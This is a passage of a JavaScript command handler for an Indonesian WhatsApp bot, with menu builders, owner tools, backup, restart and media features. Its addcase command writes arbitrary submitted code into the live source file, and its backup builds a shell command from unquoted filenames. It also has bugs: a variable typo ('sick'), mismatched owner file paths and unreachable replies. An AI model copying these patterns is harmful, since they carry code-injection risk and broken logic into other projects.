                        highlight_label: "Rekomendasi",
                        rows: [
                            { title: "Menu Owner", description: "Khusus Menu Owner ", id: `.ownermenu` },
                            { title: "Semua Menu", description: "Untuk Melihat Semua Menu", id: `.allmenu` },
                            { title: "Menu File", description: "Khusus Menu File", id: `.filemenu` },
                            { title: "Menu Tools", description: "Khusus Menu Tools", id: `.toolsmenu` },
                            { title: "Menu Download", description: "Khusus Menu Download", id: `.downloadmenu` },
                            
                            { title: "Menu Random", description: "Khusus Menu Random", id: `.randommenu` },
                            
                            { title: "Menu Cpanel", description: "Khusus Menu Cpanel", id: `.cpanelmenu` },
                            
                            { title: "Menu Cpanel V2", description: "Khusus Menu Cpanel V2", id: `.cpanelmenuv2` },
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    };

    // Push the new button properly
    buttonMessage.buttons.push(flowActions);

    await sock.sendMessage(m.chat, buttonMessage, { quoted: m });  
      
}
break;

case "toolsmenu":
              {
    // Header menu
    let teks = `Hallo Kak *${m.pushName}* 👋
Saya adalah *${global.namaBot}* berikut adalah menu yang dapat saya lakukan!

> *Bot Information*
┌───────────────────
│• ▢  Name Bot : ${global.namaBot}
│• ▢  Developer : ${global.namaOwner}
│• ▢  Version : ${global.versi}
│• ▢  Runtime : ${runtime(process.uptime())}
│• ▢  Mode Bot : ${fitur.public ? "Public" : "Self"}
└───────────────────

ᝰ.ᐟSilahkan pilih menu tools di bawah ini:

╭─━✦ *🈸 Tools Menu*
┃${prefix}toimage 
┃${prefix}tovn
┃${prefix}getpp
┃${prefix}smeme
┃${prefix}swgc
┃${prefix}hd
┃${prefix}hd2
┃${prefix}remini
┃${prefix}hdvid
┃${prefix}pplx (ai) 
┃${prefix}aichat (ai) 
┃${prefix}get
┃${prefix}get2
┃${prefix}groq
┃${prefix}ai
┃${prefix}rvo
╰━─━━─━━─━━─━━─━━━━✦`;

let buttonMessage = {
    image: { url: `https://files.catbox.moe/j1n4i7.jpg` },
    caption: teks,
    footer: "© ANDRI STORE ID V2",
    buttons: [], 
    contextInfo: {
        externalAdReply: {
            showAdAttribution: true,
            title: `ANDRI STORE ID V2`,
            body: `© ANDRI STORE`,
            thumbnailUrl: `https://files.catbox.moe/qexjj3.png`,
            sourceUrl: ``,
            mediaType: 1,
            renderLargerThumbnail: false
        }
    },
    viewOnce: true,
    headerType: 4
};


    const flowActions = {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: " ",
                sections: [
                    {
                        title: "ANDRI STORE ID V2",
                        highlight_label: "Rekomendasi",
                        rows: [
                            { title: "Menu Owner", description: "Khusus Menu Owner ", id: `.ownermenu` },
                            { title: "Semua Menu", description: "Untuk Melihat Semua Menu", id: `.allmenu` },
                            { title: "Menu File", description: "Khusus Menu File", id: `.filemenu` },
                            { title: "Menu Other", description: "Khusus Menu Other", id: `.othermenu` },
                            { title: "Menu Download", description: "Khusus Menu Download", id: `.downloadmenu` },
                            
                            { title: "Menu Random", description: "Khusus Menu Random", id: `.randommenu` },
                            
                            { title: "Menu Cpanel", description: "Khusus Menu Cpanel", id: `.cpanelmenu` },
                            { title: "Menu Cpanel V2", description: "Khusus Menu Cpanel V2", id: `.cpanelmenuv2` },
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    };

    // Push the new button properly
    buttonMessage.buttons.push(flowActions);

    await sock.sendMessage(m.chat, buttonMessage, { quoted: m });  
      
}
break;

case "cpanelmenu":
              {
    // Header menu
    let teks = `Hallo Kak *${m.pushName}* 👋
Saya adalah *${global.namaBot}* berikut adalah menu yang dapat saya lakukan!

> *Bot Information*
┌───────────────────
│• ▢  Name Bot : ${global.namaBot}
│• ▢  Developer : ${global.namaOwner}
│• ▢  Version : ${global.versi}
│• ▢  Runtime : ${runtime(process.uptime())}
│• ▢  Mode Bot : ${fitur.public ? "Public" : "Self"}
└───────────────────

ᝰ.ᐟSilahkan pilih menu cpanel di bawah ini:

╭─━✦ *🈺 Cpanel Menu*
┃${prefix}1gb - 10gb 
┃${prefix}unli
┃${prefix}listpanel 
┃${prefix}delpanel 
┃${prefix}cadmin 
┃${prefix}listadmin 
┃${prefix}deladmin
┃${prefix}clearpanel
┃${prefix}addsrv
┃${prefix}addresseler 
┃${prefix}listresseler 
┃${prefix}delresseler
╰━─━━─━━─━━─━━─━━━━✦`;

let buttonMessage = {
    image: { url: `https://files.catbox.moe/j1n4i7.jpg` },
    caption: teks,
    footer: "© ANDRI STORE ID V2",
    buttons: [], 
    contextInfo: {
        externalAdReply: {
            showAdAttribution: true,
            title: `ANDRI STORE ID V2`,
            body: `© ANDRI STORE`,
            thumbnailUrl: `https://files.catbox.moe/qexjj3.png`,
            sourceUrl: ``,
            mediaType: 1,
            renderLargerThumbnail: false
        }
    },
    viewOnce: true,
    headerType: 4
};


    const flowActions = {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: " ",
                sections: [
                    {
                        title: "ANDRI STORE ID V2",
                        highlight_label: "Rekomendasi",
                        rows: [
                            { title: "Menu Owner", description: "Khusus Menu Owner ", id: `.ownermenu` },
                            { title: "Semua Menu", description: "Untuk Melihat Semua Menu", id: `.allmenu` },
                            { title: "Menu File", description: "Khusus Menu File", id: `.filemenu` },
                            { title: "Menu Other", description: "Khusus Menu Other", id: `.othermenu` },
                            { title: "Menu Tools", description: "Khusus Menu Tools", id: `.toolsmenu` },
                            { title: "Menu Download", description: "Khusus Menu Download", id: `.downloadmenu` },
                            
                            { title: "Menu Random", description: "Khusus Menu Random", id: `.randommenu` },
                            
                            { title: "Menu Cpanel V2", description: "Khusus Menu Cpanel V2", id: `.cpanelmenuv2` },
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    };

    // Push the new button properly
    buttonMessage.buttons.push(flowActions);

    await sock.sendMessage(m.chat, buttonMessage, { quoted: m });  
      
}
break;

case "cpanelmenuv2":
              {
    // Header menu
    let teks = `Hallo Kak *${m.pushName}* 👋
Saya adalah *${global.namaBot}* berikut adalah menu yang dapat saya lakukan!

> *Bot Information*
┌───────────────────
│• ▢  Name Bot : ${global.namaBot}
│• ▢  Developer : ${global.namaOwner}
│• ▢  Version : ${global.versi}
│• ▢  Runtime : ${runtime(process.uptime())}
│• ▢  Mode Bot : ${fitur.public ? "Public" : "Self"}
└───────────────────

ᝰ.ᐟSilahkan pilih menu cpanel v2 di bawah ini:

╭─━✦ *🈺 Cpanel Menu V2*
┃${prefix}1gbv2 - 10gbv2
┃${prefix}unliv2
┃${prefix}listpanelv2
┃${prefix}delpanelv2
┃${prefix}cadminv2
┃${prefix}listadminv2
┃${prefix}deladminv2
┃${prefix}clearpanelv2
┃${prefix}addsrvv2
┃${prefix}addgrupresseler 
┃${prefix}listgrupresseler 
┃${prefix}delgrupresseler
╰━─━━─━━─━━─━━─━━━━✦`;

let buttonMessage = {
    image: { url: `https://files.catbox.moe/j1n4i7.jpg` },
    caption: teks,
    footer: "© ANDRI STORE ID V2",
    buttons: [], 
    contextInfo: {
        externalAdReply: {
            showAdAttribution: true,
            title: `ANDRI STORE ID V2`,
            body: `© ANDRI STORE`,
            thumbnailUrl: `https://files.catbox.moe/qexjj3.png`,
            sourceUrl: ``,
            mediaType: 1,
            renderLargerThumbnail: false
        }
    },
    viewOnce: true,
    headerType: 4
};


    const flowActions = {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: " ",
                sections: [
                    {
                        title: "ANDRI STORE ID V2",
                        highlight_label: "Rekomendasi",
                        rows: [
                            { title: "Menu Owner", description: "Khusus Menu Owner ", id: `.ownermenu` },
                            { title: "Semua Menu", description: "Untuk Melihat Semua Menu", id: `.allmenu` },
                            { title: "Menu File", description: "Khusus Menu File", id: `.filemenu` },
                            { title: "Menu Other", description: "Khusus Menu Other", id: `.othermenu` },
                            { title: "Menu Tools", description: "Khusus Menu Tools", id: `.toolsmenu` },
                            
                            { title: "Menu Random", description: "Khusus Menu Random", id: `.randommenu` },
                            
                            { title: "Menu Download", description: "Khusus Menu Download", id: `.downloadmenu` },
                            
                            { title: "Menu Cpanel", description: "Khusus Menu Cpanel", id: `.cpanelmenu` },
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    };

    // Push the new button properly
    buttonMessage.buttons.push(flowActions);

    await sock.sendMessage(m.chat, buttonMessage, { quoted: m });  
      
}
break;


case "downloadmenu":
              {
    // Header menu
    let teks = `Hallo Kak *${m.pushName}* 👋
Saya adalah *${global.namaBot}* berikut adalah menu yang dapat saya lakukan!

> *Bot Information*
┌───────────────────
│• ▢  Name Bot : ${global.namaBot}
│• ▢  Developer : ${global.namaOwner}
│• ▢  Version : ${global.versi}
│• ▢  Runtime : ${runtime(process.uptime())}
│• ▢  Mode Bot : ${fitur.public ? "Public" : "Self"}
└───────────────────

ᝰ.ᐟSilahkan pilih menu donwload di bawah ini:

╭─━✦ *🈲 Download Menu*
┃${prefix}play
┃${prefix}tt
┃${prefix}ttsearch
┃${prefix}ig
┃${prefix}fb
┃${prefix}spotify
┃${prefix}capcut
┃${prefix}ytmp3
┃${prefix}pin
┃${prefix}pinterest
┃${prefix}mediafire
┃${prefix}twitter
╰━─━━─━━─━━─━━─━━━━✦`;

let buttonMessage = {
    image: { url: `https://files.catbox.moe/j1n4i7.jpg` },
    caption: teks,
    footer: "© ANDRI STORE ID V2",
    buttons: [], 
    contextInfo: {
        externalAdReply: {
            showAdAttribution: true,
            title: `ANDRI STORE ID V2`,
            body: `© ANDRI STORE`,
            thumbnailUrl: `https://files.catbox.moe/qexjj3.png`,
            sourceUrl: ``,
            mediaType: 1,
            renderLargerThumbnail: false
        }
    },
    viewOnce: true,
    headerType: 4
};


    const flowActions = {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: " ",
                sections: [
                    {
                        title: "ANDRI STORE ID V2",
                        highlight_label: "Rekomendasi",
                        rows: [
                            { title: "Menu Owner", description: "Khusus Menu Owner ", id: `.ownermenu` },
                            { title: "Semua Menu", description: "Untuk Melihat Semua Menu", id: `.allmenu` },
                            { title: "Menu File", description: "Khusus Menu File", id: `.filemenu` },
                            { title: "Menu Other", description: "Khusus Menu Other", id: `.othermenu` },
                            { title: "Menu Tools", description: "Khusus Menu Tools", id: `.toolsmenu` },
                            
                            { title: "Menu Random", description: "Khusus Menu Random", id: `.randommenu` },
                            
                            { title: "Menu Cpanel V2", description: "Khusus Menu Cpanel V2", id: `.cpanelmenuv2` },
                            
                            { title: "Menu Cpanel", description: "Khusus Menu Cpanel", id: `.cpanelmenu` },
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    };

    // Push the new button properly
    buttonMessage.buttons.push(flowActions);

    await sock.sendMessage(m.chat, buttonMessage, { quoted: m });  
      
}
break;

case "randommenu":
              {
    // Header menu
    let teks = `Hallo Kak *${m.pushName}* 👋
Saya adalah *${global.namaBot}* berikut adalah menu yang dapat saya lakukan!

> *Bot Information*
┌───────────────────
│• ▢  Name Bot : ${global.namaBot}
│• ▢  Developer : ${global.namaOwner}
│• ▢  Version : ${global.versi}
│• ▢  Runtime : ${runtime(process.uptime())}
│• ▢  Mode Bot : ${fitur.public ? "Public" : "Self"}
└───────────────────

ᝰ.ᐟSilahkan pilih menu random di bawah ini:

╭─━✦ *🈲 Random Menu*
┃${prefix}cekkaya
┃${prefix}cekfemboy
┃${prefix}cekkontol
┃${prefix}cekmemek
┃${prefix}cekcantik
┃${prefix}ceklesby
┃${prefix}tekateki
┃${prefix}jawabteka
┃${prefix}hentai
╰━─━━─━━─━━─━━─━━━━✦`;

let buttonMessage = {
    image: { url: `https://files.catbox.moe/j1n4i7.jpg` },
    caption: teks,
    footer: "© ANDRI STORE ID V2",
    buttons: [], 
    contextInfo: {
        externalAdReply: {
            showAdAttribution: true,
            title: `ANDRI STORE ID V2`,
            body: `© ANDRI STORE`,
            thumbnailUrl: `https://files.catbox.moe/qexjj3.png`,
            sourceUrl: ``,
            mediaType: 1,
            renderLargerThumbnail: false
        }
    },
    viewOnce: true,
    headerType: 4
};


    const flowActions = {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: " ",
                sections: [
                    {
                        title: "ANDRI STORE ID V2",
                        highlight_label: "Rekomendasi",
                        rows: [
                            { title: "Menu Owner", description: "Khusus Menu Owner ", id: `.ownermenu` },
                            { title: "Semua Menu", description: "Untuk Melihat Semua Menu", id: `.allmenu` },
                            { title: "Menu File", description: "Khusus Menu File", id: `.filemenu` },
                            { title: "Menu Other", description: "Khusus Menu Other", id: `.othermenu` },
                            { title: "Menu Tools", description: "Khusus Menu Tools", id: `.toolsmenu` },
                            
                            { title: "Menu Download", description: "Khusus Menu Download", id: `.downloadmenu` },
                            
                            { title: "Menu Cpanel V2", description: "Khusus Menu Cpanel V2", id: `.cpanelmenuv2` },
                            
                            { title: "Menu Cpanel", description: "Khusus Menu Cpanel", id: `.cpanelmenu` },
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    };

    // Push the new button properly
    buttonMessage.buttons.push(flowActions);

    await sock.sendMessage(m.chat, buttonMessage, { quoted: m });  
      
}
break;


//** case file manager menu **
case 'listcase': {
    if (!isAn) return m.reply(mess.owner);
      const listCase = async () => {
        let code = await fs.promises.readFile("./case.js", "utf8");
        code = code.replace(/\/\/.*$/gm, ""); 
        code = code.replace(/\/\*[\s\S]*?\*\//gm, ""); 
        const regex = /case\s+['"`]([^'"`]+)['"`]\s*:/g;
        const matches = [];
        let match;
        while ((match = regex.exec(code))) {
            matches.push(match[1]);
        }
        let teks = `Total Fitur Case (${matches.length})\n\n`;
        matches.forEach(x => {
            teks += `- ${x}\n`;
        });
        return teks;
    };
    reply(await listCase());
}
break;

case "getcase": {
if (!isAn) return m.reply(mess.owner);
if (!text) return m.reply(`Contoh: ${prefix}getcase menu`)
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./case.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
m.reply(`${getcase(q)}`)
} catch (e) {
return m.reply(`Case *${text}* tidak ditemukan`)
}
}
break

case 'delcase': {
    if (!isAn) return m.reply(mess.owner);
    if (!q) return reply(example(`Nama case-nya\n*${prefix}listcase* untuk melihat semua case`));
    const hapusCase = async (filePath, caseName) => {
        try {
            let data = await fs.promises.readFile(filePath, "utf8");
            const regex = new RegExp(`case\\s+['"\`]${caseName}['"\`]:[\\s\\S]*?break`, "g");
            const modifiedData = data.replace(regex, "");
            await fs.promises.writeFile(filePath, modifiedData, "utf8");
            console.log(`Case '${caseName}' berhasil dihapus dari file.`);
        } catch (err) {
            console.error("Terjadi kesalahan:", err);
        }
    };
    await hapusCase("./case.js", q); // sesuaikan nama file
    reply(`Berhasil menghapus case *${q}*`);
}
break;

case 'addcase': {
    if (!isAn) return m.reply(mess.owner);
    if (!text) return m.reply(`Mana codenya?\n\nContoh penggunaan:\n${prefix + command} case 'tes': m.reply('halo'); break`);

    const __filename = fileURLToPath(import.meta.url);

    try {
        const data = fs.readFileSync(__filename, 'utf-8');
        const marker = "case 'addcase':"; 
        const insertIndex = data.indexOf(marker);

        if (insertIndex === -1) {
            return m.reply("❌ Gagal menemukan posisi marker 'addcase' di file ini.");
        }

        const caseBaru = `\n// [NEW CASE ADDED @ ${new Date().toLocaleTimeString()}]\n${text}\n\n`;

        const finalCode = data.slice(0, insertIndex) + caseBaru + data.slice(insertIndex);

        fs.writeFileSync(__filename, finalCode, 'utf-8');

        m.reply("*Berhasil menambahkan case baru!*");

    } catch (err) {
        console.error(err);
        m.reply(`❌ Terjadi error saat menyimpan: ${err.message}`);
    }
}
break;


// ** case owner menu **
case "ambilq": case "q": {
if (!isAn) return m.reply(mess.owner);
if (!m.quoted) return 
m.reply(JSON.stringify(m.quoted.fakeObj.message, null, 2))
}
break

case "bck": case "backup": {
    const sender = m.sender.split("@")[0];
    const isCreator = global.owner.includes(sender);
    
    if (!isCreator && m.sender !== botNumber) {
        return m.reply(mess.owner);
    }

    try {        
        m.reply("Processing Backup Script . .");
        const tmpDir = "./data/trash";
        if (fs.existsSync(tmpDir)) {
            try { 
                const files = fs.readdirSync(tmpDir).filter(f => !f.endsWith(".js"));
                for (let file of files) fs.unlinkSync(`${tmpDir}/${file}`);
            } catch {}
        }

        const dateDisplay = typeof global.tanggal === 'function' ? global.tanggal(Date.now()) : new Date().toDateString();
        
        const safeDate = dateDisplay.replace(/[^a-zA-Z0-9]/g, '_');
        const name = `backup-${safeDate}`; 

        const exclude = ["node_modules", "Auth", "session", "package-lock.json", "yarn.lock", ".npm", ".cache", ".git", ".gitignore", "setbot.json"];
        
        const filesToZip = fs.readdirSync(process.cwd())
            .filter(f => !exclude.includes(f) && f !== "" && !f.endsWith(".zip"));

        if (!filesToZip.length) return m.reply("Tidak ada file yang dapat di-backup.");

        execSync(`zip -r "${name}.zip" ${filesToZip.join(" ")}`);

        const zipPath = `./${name}.zip`;
        const zipBuffer = fs.readFileSync(zipPath);

        await sock.sendMessage(m.sender, {
            document: zipBuffer,
            fileName: `${name}.zip`,
            caption: `*SUCCESS BACKUP SCRIPT*\n\n` +
                     `- 📅 Tanggal: ${dateDisplay}\n` + 
                     `*💬 File aman tersimpan.*`, 
            mimetype: "application/zip"
        }, { quoted: m });

        if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath);

        if (m.isGroup) m.reply("Script bot berhasil dikirim ke private chat.");

    } catch (err) {
        console.error("Backup Error:", err);
        m.reply(`❌ Gagal Backup:\n${err.message}`);
    }
}
break;

case "rst": case "restart": {
  if (!isAn) return reply(mess.owner);
  const restartServer = () => {
    const newProcess = spawn(process.argv[0], process.argv.slice(1), {
      detached: true,
      stdio: "inherit",
    });
    process.exit(0);
  };
  await reply(`\`\`\`[✓] Restarting bot . . .\`\`\``);
  setTimeout(() => restartServer(), 4500);
}
break 

case "clsesi": case "clearsesi": case "celearsesion": {
if (!isAn) return reply(mess.owner)
  const pathAuth = "./Auth";
  const pathTrash = "./data/trash";

  if (!fs.existsSync(pathAuth)) fs.mkdirSync(pathAuth, { recursive: true });
  if (!fs.existsSync(pathTrash)) fs.mkdirSync(pathTrash, { recursive: true });
  const dirsesi = fs.readdirSync(pathAuth).filter(e => e !== "creds.json");
  const dirsampah = fs.readdirSync(pathTrash).filter(e => e !== "tmp");

  for (const file of dirsesi) {
    try {
      fs.unlinkSync(`${pathAuth}/${file}`);
    } catch (e) {
      console.error(`Gagal hapus ${file}:`, e.message);
    }
  }

  for (const file of dirsampah) {
    try {
      fs.unlinkSync(`${pathTrash}/${file}`);
    } catch (e) {
      console.error(`Gagal hapus ${file}:`, e.message);
    }
  }

  reply(`*Berhasil membersihkan sampah ✅*
- *${dirsesi.length}* sampah session
- *${dirsampah.length}* sampah file`);
};
break 

//======================================//
case "addowner": case "addown": {
if (!isAn) return reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("LU MAU NAMBAH OWNER MANA NOMORNYA PEA"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`NOMOR ${input2} UDAH JADI OWNER, GA USH MINTA ADD LAGI!`)
owners.push(input)
await fs.writeFileSync("./data/owner.json", JSON.stringify(owners, null, 2))
m.reply(`YE JADI OWNER DIA, BILANG APA SAMA OWNER UDH DI ADD`)
}
break

case "listowner": case "listown": {
if (owners.length < 1) return m.reply("Tidak ada owner tambahan")
let teks = `\n *乂 List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
sock.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break
case "delowner": case "delown": {
if (!isAn) return reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("LU MAU DELOWNER NOMOR NYA MANA PEA"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return m.reply(`NOMOR ${input2} BUKAN OWNER!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`SUKSES MENGHAPUS OWNER`)
}
break

case "addprem": {
if (!isAn) return reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("NOMORNYA MANA PEA"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi premium!`)
premium.push(input)
await fs.writeFileSync("./data/premium.json", JSON.stringify(premium, null, 2))
m.reply(`SUKSES MENAMBAH PREMIUM`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listprem": {
if (premium.length < 1) return m.reply("Tidak ada user reseller")
let teks = `\n *乂 List all reseller panel*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
sick.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delprem": {
if (!isAn) return reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("NOMORNYA MANA PEA"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner!`)
if (!premium.includes(input)) return m.reply(`Nomor ${input2} bukan premium!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./data/premium.json", JSON.stringify(premium, null, 2))
m.reply(`SUKSES MENGHAPUS PREMIUM`)
}
break
//=====================================//


case "self": {
    if (!isAn) return m.reply(mess.owner)
    fitur.public = false

    fs.writeFileSync(dataBot, JSON.stringify(fitur, null, 2))
    m.reply("[✓] Successful change to *self*")
    break
  }

  case "public": {
    if (!isAn) return m.reply(mess.owner)
    fitur.public = true

    fs.writeFileSync(dataBot, JSON.stringify(fitur, null, 2))
    m.reply("[✓] Successful change to *public*")
    break
  }

  case "mode": {
    m.reply(
`*Status mode bot 🤖*
- Saat ini: *${fitur.public ? "Public mode" : "Self mode"}*

*Available Command ⚙️*
- ${prefix}self
- ${prefix}public`
    )
  }
break

case "setprefix": {
 if (!isAn && !isPrem) return m.reply(mess.owner)
  if (!args[0]) {
   return m.reply(`*Usage Examples :*
› Use : ${prefix}${command} *[new prefix]*
› Example : ${prefix}${command} *🗿*

*Untuk menggunakan :*
› Ex: ${prefix}prefix on`);
        }
        
        const newPrefix = args[0]; 
        updateAndSave(newPrefix, global.multiprefix);
        
        let modeStatus = global.multiprefix 
            ? `Prefix mode *ON*. Pesan harus diawali dengan *${newPrefix}*.` 
            : `Prefix mode *OFF*. Bot merespons tanpa prefix, tapi *${newPrefix}* tersimpan.`;

        return m.reply(`*Prefix berhasil diubah*

› Prefix Baru: *${newPrefix}*

*⚠️ Note:* ${modeStatus}`);
    }
break

case 'delprefix': {
        if (!isAn && !isPrem) return m.reply(mess.owner)
        updateAndSave('.', global.multiprefix); 
        
        return m.reply(`Berhasil riset prefix menjadi default *"."* 

*Setting prefix ulang :*
› Ex: *${prefix}setprefix*`);
}
break;

case 'prefix': {
    let type = args[0] ? args[0].toLowerCase() : '';

    switch (type) {
        case 'on':
            if (!isAn) return m.reply(mess.owner);
            if (global.multiprefix) {
                return m.reply(`[✓] - *Sudah aktif!*

*Prefix info :*
› Prefix aktif: ${global.prefix || '*.*'}

*Settings prefix ulang :*
› Ex: *${prefix}setprefix*`);
            }
            
            updateAndSave(global.prefix, true);

            return m.reply(`[✓] - *Successfully activated prefix!*

*Prefix info :*
› Prefix aktif: ${global.prefix || '*.*'}

*Settings prefix ulang :*
› Ex: *${prefix}setprefix*`);

        case 'off':
            if (!isAn) return m.reply(mess.owner);
            if (!global.multiprefix) {
                return m.reply(`[✓] - *Sudah dalam mode offline*
*Prefix info :*
› Prefix aktif: *tanpa prefix*`);
            }
            
            updateAndSave(global.prefix, false);

            return m.reply(`[✓] - *Offline prefix mode!*

*Prefix info :*
› Prefix aktif: *tanpa prefix*`);

        default:
            if (!isAn) return m.reply(mess.owner);
            let status = global.multiprefix ? 'ON' : 'OFF';
            let savedPrefixDisplay = global.prefix || '**.**';
            let activePrefix = global.multiprefix ? savedPrefixDisplay : 'no prefix!'; 
            
            let helpMessage = `*Prefix Settings ⚙️*
› Mode prefix: *${status}*
› Prefix tersimpan: *${savedPrefixDisplay}*
› Prefix aktif: *${activePrefix}*

*Available Commands ✅*
› *${prefix}prefix on* /menggunakan tersimpan 
› *${prefix}prefix off* /mode tanpa prefix 
› *${prefix}setprefix* /custom new prefix
› *${prefix}delprefix* /riset prefix`;
            m.reply(helpMessage);
    }
}
break

// ** case other menu **
case 'totalfitur': {
    const __filename = fileURLToPath(import.meta.url);
    const scriptContent = fs.readFileSync(__filename, 'utf-8');
    const casePattern = /case\s+['"]([^'"]+)['"]/g;
    const matches = scriptContent.match(casePattern);
    const total = matches ? matches.length : 0;

    m.reply(`🤖 *${global.namaBot}* memiliki total fitur *${total}*`);
}
break;

case "s": case "sticker": case "stiker": {
  if (!/image|video/.test(mime))
    return reply(`Kirim atau reply foto/video dengan caption *${prefix + command}*`);

  if (/video/.test(mime)) {
    if ((qmsg.seconds || 0) > 15)
      return reply("Durasi video maksimal 15 detik!");
  }

  try {
    const mediaPath = await sock.downloadAndSaveMediaMessage(qmsg);

    await sock.sendImageAsSticker(
      m.chat,
      mediaPath,
      m,
      { author: global.author}
    );

    // hapus file sementara
    fs.unlinkSync(mediaPath);
  } catch (err) {
    console.error(err);
    reply("❌ Gagal membuat sticker!");
  }
}
break 

case "brat": {
  if (!text) return m.reply(`Contoh: ${prefix}brat hai`)
  if (text.length > 250) return m.reply(`Karakter terbatas, max 250!`)

  const encode = encodeURIComponent(text)
  const jion = `https://api.siputzx.my.id/api/m/brat?text=${encode}&isAnimated=false&delay=500`

  await sock.sendImageAsSticker(m.chat, jion, m, {
    packname: global.packname,
    author: global.author,
  })
}
break

case 'tourl': case 'reurl': case 'urlmaker': {
  const q = m.quoted ? m.quoted : m;
  if (!/image|video|audio|application/.test(mime)) {
    return m.reply("Balas media (foto/video/audio/dokumen) untuk diupload ke Catbox!");
  }

  let mediaPath = null;
  try {
    m.reply("Wait...");
    mediaPath = await sock.downloadAndSaveMediaMessage(q);
    if (!mediaPath) return m.reply("Gagal mengambil media.");
    const buffer = fs.readFileSync(mediaPath);
    const { fileTypeFromBuffer } = await import("file-type");
    const type = await fileTypeFromBuffer(buffer);
    const ext = type?.ext || "bin";
    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, {
      filename: `file.${ext}`,
      contentType: type?.mime || "application/octet-stream"
    });
    
    const res = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders()
    });

    const url = res.data.trim();

    if (fs.existsSync(mediaPath)) fs.unlinkSync(mediaPath);

    if (url.startsWith("http")) {
      m.reply(`*UPLOAD SUCCESSFUL*\n\n❖ URL: ${url}`);
    } else {
      m.reply(`Hasil upload: ${url}`);
    }

  } catch (e) {
    if (mediaPath && fs.existsSync(mediaPath)) fs.unlinkSync(mediaPath);
    console.error(e);
    m.reply("❌ Error: " + e.message);
  }
}
break;

case "cekidch":
        {
          if (!text) {
            return m.reply(example("linkchnya mana"));
          }
          if (!text.includes("https://whatsapp.com/channel/")) {
            return m.reply("Link tautan tidak valid");
          }
          let result = text.split("https://whatsapp.com/channel/")[1];
          let res = await sock.newsletterMetadata("invite", result);
          let teks = `* *ID : ${res.id}*
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`;
          let msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: {
                  body: {
                    text: teks
                  },
                  footer: {
                    text: "By aNdri Store"
                  },
                  //input watermark footer
                  nativeFlowMessage: {
                    buttons: [{
                      name: "cta_copy",
                      buttonParamsJson: `{"display_text": "GET COPY ID","copy_code": "${res.id}"}`
                    }]
                  }
                }
              }
            }
          }, {
            quoted: m
          });
          await sock.relayMessage(msg.key.remoteJid, msg.message, {
            messageId: msg.key.id
          });
        }
        break;


case "ping": case "os": {
    try {
        const THEME = {
            bg: "#0f1419", bgSecondary: "#1a1f2e", card: "#1e2433", cardHover: "#252b3d",
            primary: "#3b82f6", success: "#10b981", warning: "#f59e0b", danger: "#ef4444",
            purple: "#8b5cf6", cyan: "#06b6d4", pink: "#ec4899", textPrimary: "#f1f5f9",
            textSecondary: "#94a3b8", textTertiary: "#64748b", border: "#2d3548", glow: "rgba(59, 130, 246, 0.2)"
        };

        const formatSize = (bytes) => {
            if (bytes === 0) return '0 B';
            const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
            const i = Math.floor(Math.log(bytes) / Math.log(1024));
            return (bytes / Math.pow(1024, i)).toFixed(2) + ' ' + sizes[i];
        };

